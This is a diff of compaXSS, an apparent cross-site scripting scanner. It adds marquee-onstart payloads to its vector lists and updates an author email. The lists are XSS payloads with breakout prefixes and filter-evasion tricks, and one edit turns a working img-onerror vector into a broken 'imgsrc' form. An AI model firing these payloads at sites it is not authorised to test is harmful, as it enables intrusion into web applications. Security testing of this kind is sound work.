@@ -4,7 +4,7 @@
 #       
 #         Copyright 2013 @Fr4phc0r3 - @juan_eljach
 #
-#   <fraphcore@gmail.com>    <juan_eljach10@hotmail.com>
+#   <fraphcore@hotmail.com>    <juan_eljach10@hotmail.com>
 #
 # Update: http://bugone.tk/compaXSS
 #
@@ -70,6 +70,7 @@ vectores = [
     "<svg/onload=prompt(0);>", 
     "<body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
     "<img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
+    "<marquee/onstart=confirm(/XSS/.source);alert(1)>",
     "<img/src=` onerror=alert(1)>", 
     "<svg/onload=alert(0);prompt(0);>",
     "<scri%00pt>confirm(0);</scri%00pt>",
@@ -86,6 +87,7 @@ vectorescrazy = [ #Estableciendo la etiqueta Attr
     "javascript:alert(0);",
     "\"><script>alert(0)</script>",
     "\"><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
+    "\"><marquee/onstart=confirm(/XSS/.source);alert(1)>",
     "\"><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
     "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
     "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
@@ -93,7 +95,7 @@ vectorescrazy = [ #Estableciendo la etiqueta Attr
     "\"><scri%00pt>confirm(0);</scri%00pt>",
     "\"><script>'alert(0)%3B<%2Fscript>",
     "\"><img src=\"x\" onerror=\"alert(0)\"/>",
-    "\"><img src=x onerror=alert.onerror=alert(1)>",
+    "\"><imgsrc=x onerror=alert.onerror=alert(1)>",
     "\"><script>alert(String.fromCharCode(88,83,83));</script>",
     "\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
     "'><script>alert(1)</script>",
@@ -109,6 +111,7 @@ vectores2 = [
     "\"/><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
     "\"/><script>'alert(0)%3B<%2Fscript>",
     "\"/><scri%00pt>confirm(0);</scri%00pt>",
+    "\"/><marquee/onstart=confirm(/XSS/.source);alert(1)>",
     "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
     "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
     "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
